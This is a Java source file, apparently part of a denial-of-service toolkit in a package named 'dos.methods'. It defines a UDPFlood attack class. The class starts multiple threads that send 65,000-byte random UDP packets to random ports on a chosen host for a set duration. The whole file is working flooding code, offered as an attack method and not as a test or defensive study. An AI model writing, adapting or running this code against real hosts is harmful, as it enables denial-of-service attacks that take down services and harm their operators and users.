/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.willi.dos.methods;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

/**
 *
 * @author phamm
 */
public class UDPFlood extends AttackMethod
{

    public UDPFlood(String host, int threads, int duration)
    {
        super(host, threads, duration);
    }

    @Override
    public void startAttack()
    {
        String host = super.getHost();
        int duration = super.getDuration();
        
        for(int i = 0; i < super.getThreads(); i++)
        {
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    try
                    {
                        long endTime = System.currentTimeMillis() + (duration * 1000);
                        DatagramSocket udpsocket = new DatagramSocket();
                        while(System.currentTimeMillis() < endTime)
                        {
                            byte[] data = new byte[65000];
                            SecureRandom.getInstanceStrong().nextBytes(data);
                            DatagramPacket packettosend = new DatagramPacket(data, data.length, InetAddress.getByName(host), (int) (Math.random() * 65534) + 1); //Random Port
                            udpsocket.send(packettosend);
                        }
                        udpsocket.close();
                    }
                    catch (SocketException ex)
                    {
                        ex.printStackTrace();
                    } 
                    catch (NoSuchAlgorithmException ex)
                    {  
                        ex.printStackTrace();
                    } 
                    catch (UnknownHostException ex)
                    {
                        ex.printStackTrace();
                    } 
                    catch (IOException ex)
                    {
                        ex.printStackTrace();
                    }
                }
            }).start();
        }
    }

    
}
